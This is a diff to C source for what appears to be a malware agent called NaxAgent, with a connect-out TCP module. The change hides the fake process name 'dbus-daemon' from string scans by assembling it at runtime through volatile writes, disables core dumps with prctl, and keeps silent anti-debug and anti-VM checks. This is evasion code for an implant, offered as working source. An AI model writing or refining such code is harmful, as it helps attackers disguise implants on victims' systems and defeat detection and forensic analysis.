@@ -18,7 +18,7 @@
 #include <unistd.h>
 #include "opsec.h"
 
-#define FAKE_COMM_NAME "dbus-daemon"
+/* FAKE_COMM_NAME built at runtime via volatile writes — see nax_config.h */
 
 /* forwards */
 void nax_tcp_main(NaxAgent *a);       /* tcp.c      — connect-out */
@@ -40,9 +40,23 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t out_len)
 /* ===== Agent entry point — called from main.c or shared.c ===== */
 int agent_run(void)
 {
+
     srand((unsigned int)time(NULL));
-    prctl(PR_SET_NAME, FAKE_COMM_NAME, 0, 0, 0);
+    {
+        char _comm[32] = {0};
+#ifdef NAX_COMM_NAME_WRITE
+        volatile char *_cp = (volatile char *)_comm;
+        NAX_COMM_NAME_WRITE(_cp);
+#else
+        _comm[0]='d';_comm[1]='b';_comm[2]='u';_comm[3]='s';
+        _comm[4]='-';_comm[5]='d';_comm[6]='a';_comm[7]='e';
+        _comm[8]='m';_comm[9]='o';_comm[10]='n';
+#endif
+        prctl(PR_SET_NAME, _comm, 0, 0, 0);
+    }
     signal(SIGPIPE, SIG_IGN);
+
+    prctl(PR_SET_DUMPABLE, 0);
 
     /* OPSEC: anti-debug, anti-VM checks. Exits silently if hostile. */
     nax_opsec_check();
